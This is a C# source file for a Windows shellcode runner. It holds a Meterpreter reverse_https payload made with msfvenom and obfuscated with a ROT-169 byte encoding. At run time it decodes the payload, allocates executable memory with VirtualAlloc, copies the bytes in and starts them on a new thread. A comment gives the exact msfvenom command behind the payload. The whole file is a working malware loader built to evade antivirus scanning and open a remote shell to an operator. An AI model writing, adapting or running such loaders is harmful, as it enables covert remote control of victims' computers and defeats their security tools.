//tool-encoder ROT with key 169 C# Win32 API shellcode runner executable

using System;
using System.Runtime.InteropServices;

namespace DE_2
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            //ROTed with key 169
            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[737] { 0xa5, 0xf1, 0x2c, 0x8d, 0x99, 0x91, 0x75, 0xa9, 0xa9, 0xa9, 0xea, 0xfa, 0xea, 0xf9, 0xfb,
            0xf1, 0xda, 0x7b, 0x0e, 0xf1, 0x34, 0xfb, 0x09, 0xf1, 0x34, 0xfb, 0xc1, 0xfa, 0xf1, 0x34,
            0xfb, 0xc9, 0xff, 0xf6, 0xda, 0x72, 0xf1, 0xb8, 0x60, 0xf3, 0xf3, 0xf1, 0x34, 0x1b, 0xf9,
            0xf1, 0xda, 0x69, 0x55, 0xe5, 0x0a, 0x25, 0xab, 0xd5, 0xc9, 0xea, 0x6a, 0x72, 0xb6, 0xea,
            0xaa, 0x6a, 0x8b, 0x96, 0xfb, 0xf1, 0x34, 0xfb, 0xc9, 0x34, 0xeb, 0xe5, 0xf1, 0xaa, 0x79,
            0x0f, 0x2a, 0x21, 0xc1, 0xb4, 0xab, 0xea, 0xfa, 0xb8, 0x2e, 0x1b, 0xa9, 0xa9, 0xa9, 0x34,
            0x29, 0x31, 0xa9, 0xa9, 0xa9, 0xf1, 0x2e, 0x69, 0x1d, 0x10, 0xf1, 0xaa, 0x79, 0xed, 0x34,
            0xe9, 0xc9, 0xf2, 0xaa, 0x79, 0x34, 0xf1, 0xc1, 0xf9, 0x8c, 0xff, 0xf1, 0xa8, 0x72, 0xea,
            0x34, 0xdd, 0x31, 0xf1, 0xaa, 0x7f, 0xf6, 0xda, 0x72, 0xf1, 0xda, 0x69, 0x55, 0xea, 0x6a,
            0x72, 0xb6, 0xea, 0xaa, 0x6a, 0xe1, 0x89, 0x1e, 0x9a, 0xf5, 0xac, 0xf5, 0xcd, 0xb1, 0xee,
            0xe2, 0x7a, 0x1e, 0x81, 0x01, 0xed, 0x34, 0xe9, 0xcd, 0xf2, 0xaa, 0x79, 0x0f, 0xea, 0x34,
            0xb5, 0xf1, 0xed, 0x34, 0xe9, 0xc5, 0xf2, 0xaa, 0x79, 0xea, 0x34, 0xad, 0x31, 0xf1, 0xaa,
            0x79, 0xea, 0x01, 0xea, 0x01, 0x07, 0x02, 0x03, 0xea, 0x01, 0xea, 0x02, 0xea, 0x03, 0xf1,
            0x2c, 0x95, 0xc9, 0xea, 0xfb, 0xa8, 0x89, 0x01, 0xea, 0x02, 0x03, 0xf1, 0x34, 0xbb, 0x92,
            0xf4, 0xa8, 0xa8, 0xa8, 0x06, 0xf1, 0xda, 0x84, 0xfc, 0xf2, 0x67, 0x20, 0x12, 0x17, 0x12,
            0x17, 0x0e, 0x1d, 0xa9, 0xea, 0xff, 0xf1, 0x32, 0x8a, 0xf2, 0x70, 0x6b, 0xf5, 0x20, 0xcf,
            0xb0, 0xa8, 0x7e, 0xfc, 0xfc, 0xf1, 0x32, 0x8a, 0xfc, 0x03, 0xf6, 0xda, 0x69, 0xf6, 0xda,
            0x72, 0xfc, 0xfc, 0xf2, 0x63, 0xe3, 0xff, 0x22, 0x50, 0xa9, 0xa9, 0xa9, 0xa9, 0xa8, 0x7e,
            0x91, 0xb3, 0xa9, 0xa9, 0xa9, 0xda, 0xdb, 0xe0, 0xd7, 0xd9, 0xd7, 0xd9, 0xd7, 0xda, 0xa9,
            0x03, 0xf1, 0x32, 0x6a, 0xf2, 0x70, 0x69, 0x64, 0xaa, 0xa9, 0xa9, 0xf6, 0xda, 0x72, 0xfc,
            0xfc, 0x13, 0xac, 0xfc, 0xf2, 0x63, 0x00, 0x32, 0x48, 0x6f, 0xa9, 0xa9, 0xa9, 0xa9, 0xa8,
            0x7e, 0x91, 0x64, 0xa9, 0xa9, 0xa9, 0xd8, 0x02, 0xdf, 0x0c, 0x14, 0xee, 0xf5, 0x1f, 0xe2,
            0x17, 0x0a, 0xea, 0xfb, 0x0b, 0xfb, 0xeb, 0x1f, 0x0d, 0xda, 0x15, 0xe0, 0xd9, 0x10, 0xdb,
            0x01, 0x1c, 0xe1, 0xda, 0x0c, 0xf7, 0xde, 0x14, 0xfc, 0xf0, 0x11, 0x12, 0xf6, 0x1b, 0xea,
            0xeb, 0x14, 0xf1, 0xed, 0x17, 0x1b, 0xfc, 0x14, 0xfc, 0xf1, 0xf6, 0x03, 0x1f, 0x1d, 0xff,
            0x1e, 0xfc, 0x08, 0x0d, 0xf8, 0xfa, 0x16, 0xfd, 0xf4, 0x02, 0xdd, 0x19, 0x00, 0xef, 0x08,
            0xfe, 0x08, 0xf2, 0x02, 0x01, 0x12, 0xed, 0xfd, 0x12, 0x0d, 0x1c, 0x13, 0xec, 0xed, 0xf4,
            0x1d, 0x1e, 0x10, 0xff, 0xff, 0xd6, 0x20, 0xee, 0xe1, 0x02, 0x02, 0x0d, 0xfd, 0x17, 0xfc,
            0x1c, 0xdf, 0xe1, 0x18, 0xf4, 0xf7, 0xda, 0x22, 0x0d, 0xd6, 0xde, 0x01, 0xeb, 0xee, 0xf7,
            0xdf, 0xf0, 0xf1, 0x1b, 0xea, 0x02, 0x20, 0x0d, 0xf1, 0x02, 0xf4, 0x02, 0x22, 0xe1, 0x01,
            0xe0, 0x15, 0x19, 0x0d, 0x14, 0x10, 0xf7, 0x1b, 0xdb, 0x1b, 0x21, 0x23, 0xd6, 0xeb, 0xfc,
            0xec, 0xf8, 0x03, 0xde, 0xf7, 0xec, 0x22, 0x20, 0xeb, 0xff, 0x17, 0x01, 0x10, 0x08, 0xf9,
            0x00, 0xed, 0x0c, 0x1c, 0xeb, 0x00, 0xfc, 0xfb, 0xef, 0xf9, 0x08, 0x15, 0x1e, 0x0f, 0xe0,
            0x1c, 0xdf, 0xe2, 0x1a, 0x15, 0xfe, 0x08, 0xfb, 0xf6, 0x23, 0xd6, 0xdb, 0xa9, 0xf1, 0x32,
            0x6a, 0xfc, 0x03, 0xea, 0x01, 0xf6, 0xda, 0x72, 0xfc, 0xf1, 0x61, 0xa9, 0xdb, 0x51, 0x2d,
            0xa9, 0xa9, 0xa9, 0xa9, 0xf9, 0xfc, 0xfc, 0xf2, 0x70, 0x6b, 0x94, 0xfe, 0xd7, 0xe4, 0xa8,
            0x7e, 0xf1, 0x32, 0x6f, 0x13, 0xb3, 0x08, 0xf1, 0x32, 0x9a, 0x13, 0xc8, 0x03, 0xfb, 0x11,
            0x29, 0xdc, 0xa9, 0xa9, 0xf2, 0x32, 0x89, 0x13, 0xad, 0xea, 0x02, 0xf2, 0x63, 0x1e, 0xef,
            0x47, 0x2f, 0xa9, 0xa9, 0xa9, 0xa9, 0xa8, 0x7e, 0xf6, 0xda, 0x69, 0xfc, 0x03, 0xf1, 0x32,
            0x9a, 0xf6, 0xda, 0x72, 0xf6, 0xda, 0x72, 0xfc, 0xfc, 0xf2, 0x70, 0x6b, 0xd6, 0xaf, 0xc1,
            0x24, 0xa8, 0x7e, 0x2e, 0x69, 0x1e, 0xc8, 0xf1, 0x70, 0x6a, 0x31, 0xbc, 0xa9, 0xa9, 0xf2,
            0x63, 0xed, 0x99, 0xde, 0x89, 0xa9, 0xa9, 0xa9, 0xa9, 0xa8, 0x7e, 0xf1, 0xa8, 0x78, 0x1d,
            0xab, 0x94, 0x53, 0x91, 0xfe, 0xa9, 0xa9, 0xa9, 0xfc, 0x02, 0x13, 0xe9, 0x03, 0xf2, 0x32,
            0x7a, 0x6a, 0x8b, 0xb9, 0xf2, 0x70, 0x69, 0xa9, 0xb9, 0xa9, 0xa9, 0xf2, 0x63, 0x01, 0x4d,
            0xfc, 0x8e, 0xa9, 0xa9, 0xa9, 0xa9, 0xa8, 0x7e, 0xf1, 0x3c, 0xfc, 0xfc, 0xf1, 0x32, 0x90,
            0xf1, 0x32, 0x9a, 0xf1, 0x32, 0x83, 0xf2, 0x70, 0x69, 0xa9, 0xc9, 0xa9, 0xa9, 0xf2, 0x32,
            0xa2, 0xf2, 0x63, 0xbb, 0x3f, 0x32, 0x8b, 0xa9, 0xa9, 0xa9, 0xa9, 0xa8, 0x7e, 0xf1, 0x2c,
            0x6d, 0xc9, 0x2e, 0x69, 0x1d, 0x5b, 0x0f, 0x34, 0xb0, 0xf1, 0xaa, 0x6c, 0x2e, 0x69, 0x1e,
            0x7b, 0x01, 0x6c, 0x01, 0x13, 0xa9, 0x02, 0x64, 0x89, 0xc6, 0xd3, 0xb3, 0xea, 0x32, 0x83,
            0xa8, 0x7e };

            //unrot with key 169
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 169) & 0xFF);
            }

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, buf.Length);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}